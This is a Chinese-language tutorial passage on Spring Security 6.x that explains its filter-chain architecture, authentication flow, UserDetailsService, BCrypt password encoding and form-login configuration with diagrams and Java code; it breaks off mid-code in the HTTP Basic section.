# Spring Security 详解 - 从零到精通

> 版本基准：Spring Boot 3.x / Spring Security 6.x
> 适合人群：Java 后端开发者，有 Spring Boot 基础，希望系统掌握安全框架
> 文档目标：理论 + 源码 + 实战，一文通透 Spring Security

---

## 目录

- [Part 1: Spring Security 整体架构](#part-1-spring-security-整体架构)
- [Part 2: 认证机制深度解析](#part-2-认证机制深度解析)
- [Part 3: 授权机制深度解析](#part-3-授权机制深度解析)
- [Part 4: JWT 集成实战](#part-4-jwt-集成实战无状态认证)
- [Part 5: OAuth2.0 集成](#part-5-oauth20-集成)
- [Part 6: RBAC 权限模型实现](#part-6-rbac-权限模型实现)
- [Part 7: Spring Security 配置](#part-7-spring-security-配置securityfilterchain)
- [Part 8: 安全防护功能](#part-8-安全防护功能)
- [Part 9: 完整实战案例](#part-9-完整实战案例)
- [Part 10: 常见面试题 FAQ](#part-10-常见面试题-faq)

---
# Part 1: Spring Security 整体架构

## 1.1 Spring Security 是什么

Spring Security 是 Spring 生态中最重要的安全框架，为企业级 Java 应用提供了全面的安全解决方案。它基于 Servlet Filter 机制，以声明式的方式将安全控制无缝融入 Spring 应用。

```
+----------------------------------------------------------+
|                Spring Security 三大核心能力               |
+----------------------------------------------------------+
|                                                          |
|  1. 认证 (Authentication)                                |
|     你是谁？                                              |
|     → 验证身份：用户名+密码 / Token / 证书 / OAuth2       |
|     → 支持多种认证方式并行工作                             |
|                                                          |
|  2. 授权 (Authorization)                                 |
|     你能做什么？                                           |
|     → URL级别：控制哪些路径需要什么权限才能访问             |
|     → 方法级别：控制哪些方法需要什么权限才能调用             |
|     → 数据级别：控制用户只能访问自己的数据                  |
|                                                          |
|  3. 安全防护 (Protection)                                 |
|     防止常见Web攻击：                                     |
|     → CSRF（跨站请求伪造）                                |
|     → XSS（跨站脚本）                                    |
|     → 点击劫持（Clickjacking）                            |
|     → 会话固定攻击（Session Fixation）                    |
|     → HTTP响应头安全加固                                  |
|                                                          |
+----------------------------------------------------------+
```

### 为什么选择 Spring Security？

| 特性 | Spring Security | Apache Shiro | 自研方案 |
|------|----------------|--------------|---------|
| 与 Spring Boot 集成 | 自动配置，零配置启动 | 需手动集成 | 全手动 |
| OAuth2 / OIDC 支持 | 内置完整支持 | 需插件 | 极复杂 |
| JWT 支持 | 内置 Resource Server | 需扩展 | 手写 |
| CSRF / XSS 防护 | 内置自动 | 部分支持 | 手写 |
| 方法级安全 | @PreAuthorize 注解 | @RequiresPermissions | 手写 AOP |
| 社区支持 | Spring 官方维护 | Apache 维护 | - |
| 学习曲线 | 较陡峭 | 相对平缓 | - |
| Spring Cloud 整合 | 无缝 | 需适配 | 需适配 |

---

## 1.2 核心概念详解

### Authentication（认证对象）

`Authentication` 是 Spring Security 中最核心的接口，同时代表"认证请求"和"认证结果"：

```
Authentication 接口结构：

+----------------------------------------------------+
|                   Authentication                    |
+----------------------------------------------------+
|  getPrincipal()    → Object                         |
|  ↑ 认证前：用户名字符串 "tom"                         |
|  ↑ 认证后：UserDetails 对象（包含完整用户信息）        |
+----------------------------------------------------+
|  getCredentials()  → Object                         |
|  ↑ 通常是密码（认证成功后会被清空，防止泄露）            |
+----------------------------------------------------+
|  getAuthorities()  → Collection<GrantedAuthority>   |
|  ↑ 权限集合：["ROLE_ADMIN", "user:list", "user:add"] |
+----------------------------------------------------+
|  isAuthenticated() → boolean                        |
|  ↑ false = 待认证 Token；true = 已认证 Token          |
+----------------------------------------------------+
|  getDetails()      → Object                         |
|  ↑ 附加信息：IP地址、Session ID、浏览器信息等           |
+----------------------------------------------------+
```

**核心实现类：UsernamePasswordAuthenticationToken**

```java
// 认证前（未认证状态，在过滤器中构建）
UsernamePasswordAuthenticationToken unauthenticated = 
    UsernamePasswordAuthenticationToken.unauthenticated("tom", "password123");
// isAuthenticated() == false

// 认证后（已认证状态，由 AuthenticationProvider 返回）
UsernamePasswordAuthenticationToken authenticated = 
    new UsernamePasswordAuthenticationToken(userDetails, null, authorities);
// isAuthenticated() == true
// principal == UserDetails 对象
// credentials == null（已清空密码）
```

### Principal（主体）

主体代表当前操作的用户身份。认证前是用户名字符串，认证后是实现了 `UserDetails` 接口的用户对象。

```java
// 获取当前用户主体
Object principal = SecurityContextHolder.getContext().getAuthentication().getPrincipal();

if (principal instanceof UserDetails userDetails) {
    String username = userDetails.getUsername();
    // 可以强转为自定义的 LoginUser 获取更多信息
    LoginUser loginUser = (LoginUser) userDetails;
    Long userId = loginUser.getUserId();
}
```

### Credentials（凭证）

凭证通常是密码。Spring Security 在认证成功后会自动调用 `eraseCredentials()` 清除密码，防止密码在内存中长期驻留。

### GrantedAuthority（授权信息）

代表用户被授予的权限，本质上就是一个字符串：

```java
public interface GrantedAuthority extends Serializable {
    String getAuthority();
}

// 常用实现：SimpleGrantedAuthority
GrantedAuthority roleAdmin  = new SimpleGrantedAuthority("ROLE_ADMIN");
GrantedAuthority userList   = new SimpleGrantedAuthority("user:list");
GrantedAuthority sysMenu    = new SimpleGrantedAuthority("system:menu:view");

// 惯例：
// - 角色以 "ROLE_" 开头：ROLE_ADMIN, ROLE_USER, ROLE_MANAGER
// - 权限不加前缀：user:list, user:add, system:config:edit
```

---

## 1.3 SecurityContext 与 SecurityContextHolder

### 存储原理

```
SecurityContextHolder（ThreadLocal 存储机制）

HTTP请求1                    HTTP请求2
  |                              |
  v                              v
Thread-1                      Thread-2
+---------------------------+  +---------------------------+
| SecurityContext {          |  | SecurityContext {          |
|   authentication: {        |  |   authentication: {        |
|     principal: "tom"       |  |     principal: "jerry"     |
|     authorities: [ADMIN]   |  |     authorities: [USER]    |
|   }                        |  |   }                        |
| }                          |  | }                          |
+---------------------------+  +---------------------------+
         |                               |
         +---------------+---------------+
                         |
              SecurityContextHolder
              （内部使用 ThreadLocal<SecurityContext>）
              每个线程独立存储，互不干扰
```

### 三种存储策略

```java
// 1. MODE_THREADLOCAL（默认）
//    每个线程独立存储，适合 Web 应用（每个请求一个线程）
SecurityContextHolder.setStrategyName(SecurityContextHolder.MODE_THREADLOCAL);

// 2. MODE_INHERITABLETHREADLOCAL
//    子线程可继承父线程的 SecurityContext
//    适合需要在子线程中访问安全信息的场景
SecurityContextHolder.setStrategyName(SecurityContextHolder.MODE_INHERITABLETHREADLOCAL);

// 3. MODE_GLOBAL
//    全局共享，不适合多用户 Web 应用
SecurityContextHolder.setStrategyName(SecurityContextHolder.MODE_GLOBAL);
```

### 常用操作

```java
// ① 获取当前认证信息
Authentication authentication = SecurityContextHolder.getContext().getAuthentication();

// ② 获取当前用户名
String username = authentication.getName();

// ③ 获取当前用户完整对象
LoginUser loginUser = (LoginUser) authentication.getPrincipal();
Long userId = loginUser.getUserId();

// ④ 判断是否已认证（排除匿名用户）
boolean isAuthenticated = authentication != null 
    && authentication.isAuthenticated() 
    && !(authentication instanceof AnonymousAuthenticationToken);

// ⑤ 手动设置认证信息（测试/特殊场景）
UserDetails userDetails = userDetailsService.loadUserByUsername("tom");
UsernamePasswordAuthenticationToken auth = 
    new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
SecurityContextHolder.getContext().setAuthentication(auth);

// ⑥ 清除认证信息（登出时）
SecurityContextHolder.clearContext();

// ⑦ 在 @RestController 中通过参数注入
@GetMapping("/profile")
public ResponseEntity<?> getProfile(@AuthenticationPrincipal LoginUser loginUser) {
    return ResponseEntity.ok(loginUser);
}
```

---

## 1.4 过滤器链架构（FilterChainProxy）

### 整体架构图

```
浏览器/移动端/API客户端
        |
        | HTTP 请求
        v
+-------------------+
| Tomcat Servlet容器 |
+-------------------+
        |
        v
+--------------------------------------------------+
|  DelegatingFilterProxy                            |
|  （Spring 注册到 Servlet 容器的代理 Filter）        |
|  名称: "springSecurityFilterChain"                |
+--------------------------------------------------+
        |
        | 委托给 Spring Bean
        v
+--------------------------------------------------+
|  FilterChainProxy                                 |
|  （Spring Security 核心，管理多条 SecurityFilterChain）|
+--------------------------------------------------+
        |
        | 根据请求URL匹配对应的 SecurityFilterChain
        |
        +----------+----------+----------+
        |          |          |          |
        v          v          v          v
    Chain-1     Chain-2    Chain-3    Chain-4
  /api/**    /admin/**  /actuator/** /**（默认）
  (JWT认证)  (表单登录)   (Basic认证)  (表单登录)
        |
        | 以 Chain-1 为例，按顺序执行：
        v

+--------------------------------------------------+
|        SecurityFilterChain 过滤器执行顺序           |
|        （Spring Security 6.x 默认）                |
+--------------------------------------------------+
|                                                  |
|   1. DisableEncodeUrlFilter                      |
|      禁止将 session id 编码到 URL 中               |
|                                                  |
|   2. WebAsyncManagerIntegrationFilter            |
|      处理异步请求的 SecurityContext 传播            |
|                                                  |
|   3. SecurityContextHolderFilter          ★      |
|      从存储（Session/其他）恢复 SecurityContext     |
|                                                  |
|   4. HeaderWriterFilter                          |
|      写入安全相关的 HTTP 响应头                     |
|      (X-Frame-Options, X-XSS-Protection 等)      |
|                                                  |
|   5. CorsFilter                                  |
|      处理跨域资源共享（CORS）                       |
|                                                  |
|   6. CsrfFilter                           ★      |
|      CSRF 攻击防护                                |
|                                                  |
|   7. LogoutFilter                                |
|      处理登出请求（默认 /logout）                   |
|                                                  |
|   8. UsernamePasswordAuthenticationFilter ★      |
|      处理表单登录（POST /login）                   |
|                                                  |
|   9. DefaultLoginPageGeneratingFilter            |
|      生成默认登录页面（HTML）                       |
|                                                  |
|  10. DefaultLogoutPageGeneratingFilter           |
|      生成默认登出页面（HTML）                       |
|                                                  |
|  11. BasicAuthenticationFilter            ★      |
|      处理 HTTP Basic 认证                         |
|                                                  |
|  12. RequestCacheAwareFilter                     |
|      从缓存恢复被拦截的请求（登录后跳回原页面）       |
|                                                  |
|  13. SecurityContextHolderAwareFilter            |
|      为 HttpServletRequest 增加安全相关方法         |
|                                                  |
|  14. AnonymousAuthenticationFilter        ★      |
|      为未认证请求设置匿名 Authentication            |
|                                                  |
|  15. SessionManagementFilter                     |
|      管理 Session（固定攻击防护、并发控制等）        |
|                                                  |
|  16. ExceptionTranslationFilter           ★      |
|      将安全异常转换为 HTTP 响应                     |
|      (AuthenticationException → 401/登录页)       |
|      (AccessDeniedException → 403)               |
|                                                  |
|  17. AuthorizationFilter                  ★      |
|      最终授权决策（允许/拒绝访问）                   |
|                                                  |
+--------------------------------------------------+
        |
        v
  目标 Servlet / Spring MVC DispatcherServlet
        |
        v
  @RestController / @Controller 方法执行
```

### 查看当前过滤器链（调试技巧）

```java
// 在 SecurityFilterChain Bean 中打印过滤器列表
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    // ... 配置 ...
    SecurityFilterChain chain = http.build();
    
    // 打印过滤器列表（调试用）
    chain.getFilters().forEach(filter -> 
        System.out.println(filter.getClass().getSimpleName()));
    
    return chain;
}

// 或者开启 Spring Security DEBUG 日志
// application.yml:
// logging:
//   level:
//     org.springframework.security: DEBUG
```

---

## 1.5 完整认证流程时序图

```
客户端              过滤器链              AuthenticationManager    UserDetailsService    DB
  |                    |                         |                       |              |
  |                    |                         |                       |              |
  |--- POST /login --->|                         |                       |              |
  |    username=tom    |                         |                       |              |
  |    password=123    |                         |                       |              |
  |                    |                         |                       |              |
  |              [UsernamePasswordAuthenticationFilter]                  |              |
  |                    |                         |                       |              |
  |              提取 username/password           |                       |              |
  |              构建未认证 Token                  |                       |              |
  |                    |                         |                       |              |
  |                    |--- authenticate(token)->|                       |              |
  |                    |                         |                       |              |
  |                    |                   [ProviderManager]             |              |
  |                    |                   遍历 Providers                |              |
  |                    |                         |                       |              |
  |                    |               [DaoAuthenticationProvider]       |              |
  |                    |                         |--- loadUserByUsername(tom) --------->|
  |                    |                         |                       |-- SELECT --> |
  |                    |                         |                       |<-- User ---- |
  |                    |                         |<-- UserDetails -------|              |
  |                    |                         |                       |              |
  |                    |                   比对密码: BCrypt.matches()     |              |
  |                    |                   检查账号状态                    |              |
  |                    |                         |                       |              |
  |                    |<-- 认证成功 Token -------|                       |              |
  |                    |    (principal=UserDetails,                      |              |
  |                    |     authorities=[ROLE_ADMIN])                   |              |
  |                    |                         |                       |              |
  |              存入 SecurityContextHolder        |                       |              |
  |              触发 AuthenticationSuccessEvent  |                       |              |
  |              调用 AuthenticationSuccessHandler|                       |              |
  |                    |                         |                       |              |
  |<-- 200 {token:xxx}-|                         |                       |              |
  |                    |                         |                       |              |
  |                    |                         |                       |              |
  |--- GET /api/me --->|                         |                       |              |
  |    Authorization:  |                         |                       |              |
  |    Bearer xxx      |                         |                       |              |
  |                    |                         |                       |              |
  |              [JwtAuthenticationFilter]        |                       |              |
  |              解析 JWT Token                   |                       |              |
  |              设置 SecurityContext             |                       |              |
  |                    |                         |                       |              |
  |              [AuthorizationFilter]            |                       |              |
  |              检查 /api/me 权限                |                       |              |
  |              hasRole('USER') → GRANTED       |                       |              |
  |                    |                         |                       |              |
  |<-- 200 {用户信息} --|                         |                       |              |
```
---

# Part 2: 认证机制深度解析

## 2.1 AuthenticationManager 与 ProviderManager 委托链

### 接口定义

```java
public interface AuthenticationManager {
    /**
     * 尝试对传入的 Authentication 进行认证
     * @param authentication 待认证对象（通常包含用户名+密码）
     * @return 认证成功的 Authentication（包含权限信息）
     * @throws AuthenticationException 认证失败时抛出
     */
    Authentication authenticate(Authentication authentication) throws AuthenticationException;
}
```

### ProviderManager 委托链架构

```
ProviderManager 内部逻辑：

authenticate(UsernamePasswordAuthenticationToken)
        |
        v
+------------------------------------------+
|           ProviderManager                 |
|                                           |
|  List<AuthenticationProvider> providers: |
|  +--------------------------------------+|
|  | [0] DaoAuthenticationProvider        ||  ← 支持 UsernamePasswordAuthToken
|  |     supports(class) → true           ||
|  |     authenticate() → 成功/失败        ||
|  +--------------------------------------+|
|  | [1] JwtAuthenticationProvider        ||  ← 支持 BearerTokenAuthenticationToken
|  |     supports(class) → false          ||  ← 不支持，跳过
|  +--------------------------------------+|
|  | [2] LdapAuthenticationProvider       ||  ← 支持 LDAP 认证
|  |     supports(class) → false          ||  ← 不支持，跳过
|  +--------------------------------------+|
|                                           |
|  如果所有 Provider 均返回 null：           |
|  → 委托给 parent AuthenticationManager   |
+------------------------------------------+

认证异常分类：
  BadCredentialsException      → 密码错误
  UsernameNotFoundException    → 用户不存在
  DisabledException            → 账号已禁用
  LockedException              → 账号已锁定
  AccountExpiredException      → 账号已过期
  CredentialsExpiredException  → 密码已过期
  InternalAuthenticationServiceException → 内部服务异常
```

### 自定义 ProviderManager（多认证方式）

```java
@Configuration
public class MultiAuthConfig {

    @Bean
    public AuthenticationManager authenticationManager(
            DaoAuthenticationProvider daoProvider,
            SmsAuthenticationProvider smsProvider) {
        // 同时支持密码登录和短信验证码登录
        return new ProviderManager(List.of(daoProvider, smsProvider));
    }

    @Bean
    public DaoAuthenticationProvider daoAuthenticationProvider(
            UserDetailsService userDetailsService,
            PasswordEncoder passwordEncoder) {
        DaoAuthenticationProvider provider = new DaoAuthenticationProvider();
        provider.setUserDetailsService(userDetailsService);
        provider.setPasswordEncoder(passwordEncoder);
        // 隐藏用户不存在异常（防止用户名枚举攻击）
        provider.setHideUserNotFoundExceptions(true);
        return provider;
    }
}
```

---

## 2.2 DaoAuthenticationProvider 深度解析

`DaoAuthenticationProvider` 是最常用的认证 Provider，源码核心逻辑如下：

```java
// DaoAuthenticationProvider 核心源码（简化版，便于理解）
public class DaoAuthenticationProvider extends AbstractUserDetailsAuthenticationProvider {

    private UserDetailsService userDetailsService;
    private PasswordEncoder passwordEncoder;

    // 1. 加载用户（由父类调用）
    @Override
    protected UserDetails retrieveUser(String username,
                                       UsernamePasswordAuthenticationToken authentication) {
        try {
            UserDetails loadedUser = userDetailsService.loadUserByUsername(username);
            if (loadedUser == null) {
                throw new InternalAuthenticationServiceException(
                    "UserDetailsService 返回了 null，这是不允许的");
            }
            return loadedUser;
        } catch (UsernameNotFoundException ex) {
            // 注意：即使用户不存在，也要执行密码匹配（防止时序攻击）
            // 通过比对一个虚假密码来保证响应时间一致
            mitigateAgainstTimingAttack(authentication);
            throw ex;
        }
    }

    // 2. 附加检查（密码验证）
    @Override
    protected void additionalAuthenticationChecks(
            UserDetails userDetails,
            UsernamePasswordAuthenticationToken authentication) {

        if (authentication.getCredentials() == null) {
            throw new BadCredentialsException("凭证不能为空");
        }

        String presentedPassword = authentication.getCredentials().toString();

        // 使用 PasswordEncoder 比对密码（BCrypt比对）
        if (!passwordEncoder.matches(presentedPassword, userDetails.getPassword())) {
            throw new BadCredentialsException("用户名或密码错误");
        }
    }
}

// 父类 AbstractUserDetailsAuthenticationProvider 核心逻辑
public abstract class AbstractUserDetailsAuthenticationProvider {

    @Override
    public Authentication authenticate(Authentication authentication) {
        String username = authentication.getName();

        // 1. 先查缓存（避免频繁查库）
        UserDetails user = userCache.getUserFromCache(username);

        if (user == null) {
            // 2. 缓存未命中，调用 retrieveUser 加载
            user = retrieveUser(username, (UsernamePasswordAuthenticationToken) authentication);
        }

        // 3. 检查账号状态（4个状态检查）
        preAuthenticationChecks.check(user);  // 检查 enabled/accountNonExpired/accountNonLocked

        // 4. 附加检查（密码比对）
        additionalAuthenticationChecks(user, (UsernamePasswordAuthenticationToken) authentication);

        // 5. 检查凭证状态
        postAuthenticationChecks.check(user);  // 检查 credentialsNonExpired

        // 6. 存入缓存
        userCache.putUserInCache(user);

        // 7. 构建并返回已认证的 Token
        return createSuccessAuthentication(user, authentication, user);
    }

    protected Authentication createSuccessAuthentication(Object principal,
                                                          Authentication authentication,
                                                          UserDetails user) {
        // 注意：这里的 principal 是 UserDetails 对象
        UsernamePasswordAuthenticationToken result =
            new UsernamePasswordAuthenticationToken(principal, authentication.getCredentials(),
                                                    authoritiesMapper.mapAuthorities(user.getAuthorities()));
        result.setDetails(authentication.getDetails());
        return result;
    }
}
```

---

## 2.3 UserDetailsService 接口实现

### 接口定义

```java
@FunctionalInterface
public interface UserDetailsService {
    UserDetails loadUserByUsername(String username) throws UsernameNotFoundException;
}
```

### 完整实现（从数据库加载，含缓存优化）

```java
@Service
@RequiredArgsConstructor
@Slf4j
public class CustomUserDetailsService implements UserDetailsService {

    private final SysUserRepository userRepository;
    private final SysRoleRepository roleRepository;
    private final SysPermissionRepository permissionRepository;
    private final RedisTemplate<String, Object> redisTemplate;

    // 用户信息缓存时间（分钟）
    private static final long USER_CACHE_MINUTES = 10;
    private static final String USER_CACHE_PREFIX = "security:user:";

    @Override
    @Transactional(readOnly = true)
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        log.debug("加载用户信息: {}", username);

        // 1. 先查 Redis 缓存
        String cacheKey = USER_CACHE_PREFIX + username;
        Object cached = redisTemplate.opsForValue().get(cacheKey);
        if (cached instanceof LoginUser loginUser) {
            log.debug("从缓存加载用户: {}", username);
            return loginUser;
        }

        // 2. 查数据库（支持用户名或邮箱登录）
        SysUser user = userRepository.findByUsernameAndDeletedFalse(username)
            .or(() -> userRepository.findByEmailAndDeletedFalse(username))
            .orElseThrow(() -> {
                log.warn("用户不存在: {}", username);
                return new UsernameNotFoundException("用户不存在: " + username);
            });

        // 3. 加载该用户的所有角色和权限
        List<String> roleCodes = roleRepository.findCodesByUserId(user.getId());
        List<String> permCodes = permissionRepository.findCodesByUserId(user.getId());

        // 4. 构建 LoginUser（自定义 UserDetails）
        LoginUser loginUser = new LoginUser(user, roleCodes, permCodes);

        // 5. 存入 Redis 缓存
        redisTemplate.opsForValue().set(cacheKey, loginUser, USER_CACHE_MINUTES, TimeUnit.MINUTES);

        return loginUser;
    }

    /**
     * 用户信息变更时（改密、禁用等）清除缓存
     */
    public void evictUserCache(String username) {
        redisTemplate.delete(USER_CACHE_PREFIX + username);
    }
}
```

### Repository 中的 SQL 查询

```java
// SysUserRepository.java
public interface SysUserRepository extends JpaRepository<SysUser, Long> {
    Optional<SysUser> findByUsernameAndDeletedFalse(String username);
    Optional<SysUser> findByEmailAndDeletedFalse(String email);
}

// SysRoleRepository.java - 查询用户的角色编码列表
public interface SysRoleRepository extends JpaRepository<SysRole, Long> {

    @Query("""
        SELECT r.code FROM SysRole r
        JOIN SysUserRole ur ON r.id = ur.roleId
        WHERE ur.userId = :userId AND r.status = 1
        """)
    List<String> findCodesByUserId(@Param("userId") Long userId);
}

// SysPermissionRepository.java - 查询用户的权限编码列表
public interface SysPermissionRepository extends JpaRepository<SysPermission, Long> {

    @Query("""
        SELECT DISTINCT p.code FROM SysPermission p
        JOIN SysRolePermission rp ON p.id = rp.permissionId
        JOIN SysRole r ON r.id = rp.roleId
        JOIN SysUserRole ur ON r.id = ur.roleId
        WHERE ur.userId = :userId AND r.status = 1 AND p.status = 1
        AND p.code IS NOT NULL AND p.code != ''
        """)
    List<String> findCodesByUserId(@Param("userId") Long userId);
}
```

---

## 2.4 UserDetails 接口详解

### 接口定义

```java
public interface UserDetails extends Serializable {

    // 必须实现的方法
    Collection<? extends GrantedAuthority> getAuthorities(); // 权限集合
    String getPassword();                                     // 加密后的密码
    String getUsername();                                     // 用户名

    // 有默认实现（默认 true，即正常状态）
    default boolean isAccountNonExpired()    { return true; } // 账号未过期
    default boolean isAccountNonLocked()     { return true; } // 账号未锁定
    default boolean isCredentialsNonExpired(){ return true; } // 凭证未过期
    default boolean isEnabled()              { return true; } // 账号已启用
}
```

### 自定义 LoginUser（生产级实现）

```java
@Data
@NoArgsConstructor
public class LoginUser implements UserDetails {

    private static final long serialVersionUID = 1L;

    // 用户基础信息
    private Long    userId;
    private String  username;
    private String  password;
    private String  nickname;
    private String  email;
    private String  avatar;
    private Integer status;     // 1启用 0禁用

    // 角色编码列表（如：["ADMIN", "USER"]）
    private List<String> roleCodes;
    // 权限编码列表（如：["user:list", "user:add"]）
    private List<String> permCodes;

    // 登录信息
    private String  loginIp;
    private LocalDateTime loginTime;

    // 不序列化到 Redis（权限可以从 roleCodes/permCodes 重建）
    @JsonIgnore
    private transient Collection<GrantedAuthority> authorities;

    public LoginUser(SysUser user, List<String> roleCodes, List<String> permCodes) {
        this.userId    = user.getId();
        this.username  = user.getUsername();
        this.password  = user.getPassword();
        this.nickname  = user.getNickname();
        this.email     = user.getEmail();
        this.avatar    = user.getAvatar();
        this.status    = user.getStatus();
        this.roleCodes = roleCodes;
        this.permCodes = permCodes;
    }

    @Override
    @JsonIgnore
    public Collection<? extends GrantedAuthority> getAuthorities() {
        if (this.authorities != null) {
            return this.authorities;
        }
        // 懒加载：将角色和权限编码转换为 GrantedAuthority 集合
        Set<GrantedAuthority> authSet = new HashSet<>();
        if (roleCodes != null) {
            roleCodes.forEach(role ->
                authSet.add(new SimpleGrantedAuthority("ROLE_" + role)));
        }
        if (permCodes != null) {
            permCodes.forEach(perm ->
                authSet.add(new SimpleGrantedAuthority(perm)));
        }
        this.authorities = authSet;
        return authSet;
    }

    @Override
    public boolean isEnabled()           { return status != null && status == 1; }
    @Override
    public boolean isAccountNonLocked()  { return status != null && status == 1; }
    @Override
    public boolean isAccountNonExpired() { return true; }
    @Override
    public boolean isCredentialsNonExpired() { return true; }
}
```

---

## 2.5 PasswordEncoder 详解

### BCrypt 加密原理

```
BCrypt 哈希算法详解：

输入：明文密码 "mypassword123"
        |
        v
[1] 生成随机 Salt（128位/16字节，Base64编码为22字符）
    Salt = "N9qo8uLOickgx2ZMRZoMye"
        |
        v
[2] 将密码+Salt 通过 Blowfish 算法迭代计算
    迭代次数 = 2^cost（默认cost=10，即1024次）
        |
        v
[3] 生成哈希值（184位，Base64编码为31字符）
    Hash = "IjZAgcfl7p92ldGxad68LJZdL17lhWy"
        |
        v
[4] 拼接为完整的 BCrypt 字符串（60字符）：
    $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
    ↑↑↑ ↑↑ ↑←-22位Salt-→↑←-----------31位Hash-----------→↑
    版本 cost

验证过程：
  1. 从存储的哈希值中提取 Salt（固定位置的22字符）
  2. 用相同 Salt 对输入密码重新计算 BCrypt
  3. 比对计算结果与存储哈希值
  4. 一致则验证通过

安全特性：
  ✓ 每次加密结果不同（随机Salt）→ 防彩虹表攻击
  ✓ 单向哈希，无法逆推明文
  ✓ 计算慢（可调节cost）→ 防暴力破解
  ✓ 内嵌Salt → 不需要额外存储Salt
```

### 完整 PasswordEncoder 使用

```java
// 1. 配置（推荐 DelegatingPasswordEncoder 以支持未来算法升级）
@Bean
public PasswordEncoder passwordEncoder() {
    // 方式一：直接使用 BCrypt（简单场景）
    // return new BCryptPasswordEncoder(10);

    // 方式二：DelegatingPasswordEncoder（推荐，支持多种算法）
    // 密码存储格式：{bcrypt}$2a$10$...
    return PasswordEncoderFactories.createDelegatingPasswordEncoder();
}

// 2. 注册时加密密码
@Service
public class UserService {
    @Autowired
    private PasswordEncoder passwordEncoder;

    public void register(String username, String rawPassword) {
        String encodedPassword = passwordEncoder.encode(rawPassword);
        // 存储 encodedPassword 到数据库
        // 例如：$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
    }

    // 3. 修改密码
    public void changePassword(Long userId, String oldPassword, String newPassword) {
        User user = userRepository.findById(userId).orElseThrow();

        // 验证旧密码
        if (!passwordEncoder.matches(oldPassword, user.getPassword())) {
            throw new BusinessException("原密码错误");
        }

        // 加密新密码并保存
        user.setPassword(passwordEncoder.encode(newPassword));
        userRepository.save(user);
    }
}

// 4. 常见 PasswordEncoder 对比
BCryptPasswordEncoder bcrypt = new BCryptPasswordEncoder(10);  // 推荐
// Pbkdf2PasswordEncoder  pbkdf2 = new Pbkdf2PasswordEncoder(); // 也不错
// SCryptPasswordEncoder  scrypt = new SCryptPasswordEncoder(); // 内存密集型
// Argon2PasswordEncoder  argon2 = new Argon2PasswordEncoder(); // 最安全但最慢
// NoOpPasswordEncoder    noop   = NoOpPasswordEncoder.getInstance(); // 禁止生产使用！

// 5. 性能测试（cost=10 时）
long start = System.currentTimeMillis();
String encoded = bcrypt.encode("password");
long elapsed = System.currentTimeMillis() - start;
System.out.println("BCrypt 编码耗时: " + elapsed + "ms");  // 约 80-200ms
// 这意味着每秒最多只能暴力尝试 5-12 次密码，大幅增加破解成本
```

---

## 2.6 表单登录（formLogin）完整配置

### 传统 Session 方式

```java
@Configuration
@EnableWebSecurity
public class FormLoginSecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            // ① 表单登录配置
            .formLogin(form -> form
                .loginPage("/login")                    // 自定义登录页 URL（GET）
                .loginProcessingUrl("/auth/login")      // 登录表单提交 URL（POST）
                .usernameParameter("loginName")         // 用户名字段名，默认"username"
                .passwordParameter("loginPwd")          // 密码字段名，默认"password"
                .defaultSuccessUrl("/dashboard", true)  // 登录成功跳转（true=强制跳转）
                .failureUrl("/login?error")             // 登录失败跳转
                .permitAll()                            // 放行登录页相关路径
            )

            // ② 登出配置
            .logout(logout -> logout
                .logoutUrl("/auth/logout")              // 登出 URL（POST请求触发）
                .logoutSuccessUrl("/login?logout")      // 登出成功跳转
                .invalidateHttpSession(true)            // 使 Session 失效
                .clearAuthentication(true)              // 清除认证信息
                .deleteCookies("JSESSIONID")            // 删除 Cookie
            )

            // ③ 权限配置
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/login", "/register", "/css/**", "/js/**").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            );

        return http.build();
    }
}
```

### 前后端分离方式（JSON响应）

```java
// 登录成功处理器
@Component
@RequiredArgsConstructor
public class LoginSuccessHandler implements AuthenticationSuccessHandler {

    private final JwtTokenUtil jwtTokenUtil;
    private final ObjectMapper objectMapper;

    @Override
    public void onAuthenticationSuccess(HttpServletRequest request,
                                         HttpServletResponse response,
                                         Authentication authentication) throws IOException {
        LoginUser loginUser = (LoginUser) authentication.getPrincipal();

        // 生成 JWT Token
        String accessToken  = jwtTokenUtil.generateAccessToken(loginUser);
        String refreshToken = jwtTokenUtil.generateRefreshToken(loginUser);

        // 构建响应
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("code", 200);
        result.put("message", "登录成功");
        result.put("data", Map.of(
            "accessToken",  accessToken,
            "refreshToken", refreshToken,
            "tokenType",    "Bearer",
            "expiresIn",    1800,        // 秒
            "username",     loginUser.getUsername(),
            "nickname",     loginUser.getNickname(),
            "roles",        loginUser.getRoleCodes(),
            "permissions",  loginUser.getPermCodes()
        ));

        response.setContentType("application/json;charset=UTF-8");
        response.setStatus(HttpServletResponse.SC_OK);
        objectMapper.writeValue(response.getWriter(), result);
    }
}

// 登录失败处理器
@Component
@RequiredArgsConstructor
public class LoginFailureHandler implements AuthenticationFailureHandler {

    private final ObjectMapper objectMapper;

    @Override
    public void onAuthenticationFailure(HttpServletRequest request,
                                         HttpServletResponse response,
                                         AuthenticationException exception) throws IOException {
        String message;
        if (exception instanceof BadCredentialsException) {
            message = "用户名或密码错误";
        } else if (exception instanceof DisabledException) {
            message = "账号已被禁用";
        } else if (exception instanceof LockedException) {
            message = "账号已被锁定，请联系管理员";
        } else if (exception instanceof AccountExpiredException) {
            message = "账号已过期";
        } else if (exception instanceof CredentialsExpiredException) {
            message = "密码已过期，请修改密码";
        } else {
            message = "登录失败: " + exception.getMessage();
        }

        Map<String, Object> result = Map.of("code", 401, "message", message);

        response.setContentType("application/json;charset=UTF-8");
        response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
        objectMapper.writeValue(response.getWriter(), result);
    }
}
```

---

## 2.7 HTTP Basic 认证

```java
@Bean
public SecurityFilterChain basicAuthFilterChain(HttpSecurity http) throws Exception {
    http
        .securityMatcher("/api/internal/**")   // 只对内部 API 使用 Basic 认证
        .httpBasic(basic -> basic
            .realmName("Internal API")
            .authenticationEntryPoint((request, response, ex) -> {
                response.setHeader("WWW-Authenticate", "Basic realm=\"Internal API\"");
